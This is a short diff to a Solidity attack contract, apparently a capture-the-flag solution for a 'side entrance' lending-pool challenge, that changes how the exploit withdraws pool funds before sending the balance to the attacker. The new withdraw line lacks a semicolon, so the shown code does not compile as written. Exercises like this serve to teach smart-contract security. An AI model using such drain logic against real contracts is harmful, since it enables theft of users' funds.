@@ -48,11 +48,8 @@ contract SideEntraceAttack {
     }
 
     function printMoney() external {
-        pool.functionCallWithValue(
-            abi.encodeWithSignature(
-                "withdraw()"
-            )
-        );
+        IPoolFunc(pool).withdraw()
+        console.log("BBRRRTTTT")
         address(attacker).send(balance);
 
     }
